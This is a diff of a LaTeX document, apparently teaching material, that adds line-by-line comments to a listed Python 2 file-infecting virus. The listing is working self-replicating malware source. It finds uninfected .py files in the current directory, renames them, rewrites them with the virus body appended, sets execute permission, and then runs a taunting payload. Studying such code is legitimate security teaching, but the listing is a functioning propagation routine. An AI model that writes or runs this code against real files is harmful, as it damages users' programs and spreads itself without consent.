@@ -101,11 +101,8 @@ exec e
 
 
 \begin{minted}[mathescape,
-               linenos,
-               numbersep=5pt,
-               gobble=2,
-               frame=lines,
-               framesep=2mm]{csharp}
+               linenos]{python}
+import os
 def is_infected(filename):
    f = open(filename, 'r')
    lines = f.readlines()
@@ -116,22 +113,29 @@ def is_infected(filename):
    return lines[len(lines) - 46].startswith('######################################################## First script python')
 
 def infect(filename):
+   # Rename the file as a temporary file
    os.rename(filename, filename + '-copy')
-
+   # Create a new file named as previous file
    destination = open(filename, 'w')
+   # Set execution permission to the file
+   os.chmod(filename, S_IEXEC)
+   # Open the temporary file   
    source = open(filename + '-copy', 'r')
+   # Open this file
    this = open(__main__.__file__, 'r')
 
-   # Append the original file
+   # Copy the content of this file into the destination file
    for line in source:
       destination.write(line)
-
+   # Write the key
    destination.write("\n######################################################## First script python\n")
    destination.write("# coding=utf-8\n")
    destination.write("# Start Uncrypted\n")
-
+   # Set the copy to False, uncrypted body not found yet
    copy = False
+   # Initialize result
    result = ''
+   # For every line
    for line in this:
       if line.strip() == '# Start Uncrypted':
          copy = True
@@ -152,14 +156,16 @@ def infect(filename):
    this.close()
  
 def find_and_infect_files():
-   # In the current directory
    path = '.'
+   # Lists all files inside current directory
    dirs = os.listdir(path)
 
    # For each file try to infect it
    for filename in dirs:
+      # If file ends with .py, is not already infected and it's not virus itself (virus.py)
       if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
          print "Infected " +  str(filename)
+         # Infect file with the virus
          infect(filename)
 
 def encrypt(data,filename):
@@ -176,7 +182,9 @@ def encrypt(data,filename):
 def payload():
    print "This file is infected infected! Mhuahauhauahau!"
 
+# Find and infect files
 find_and_infect_files()
+# Execute the payload
 payload()
 \end{minted}
 
